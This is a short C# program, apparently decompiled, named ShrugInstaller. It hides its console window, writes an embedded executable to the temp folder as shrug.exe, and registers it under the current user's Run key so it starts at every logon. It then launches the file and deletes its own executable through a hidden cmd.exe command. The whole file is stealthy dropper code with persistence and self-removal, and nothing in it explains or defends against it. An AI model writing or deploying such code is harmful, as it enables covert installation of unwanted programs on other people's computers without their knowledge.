using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using ShrugInstaller.Properties;

namespace ShrugInstaller;

internal class Program
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		ShowWindow(GetConsoleWindow(), 0);
		string text = Path.Combine(Path.GetTempPath(), "shrug.exe");
		File.WriteAllBytes(text, Resources.Shrug);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")!.OpenSubKey("Microsoft")!.OpenSubKey("Windows")!.OpenSubKey("CurrentVersion")!.OpenSubKey("Run", writable: true);
		registryKey.SetValue("Shrug", text);
		Process.Start(text);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Application.get_ExecutablePath();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}
}
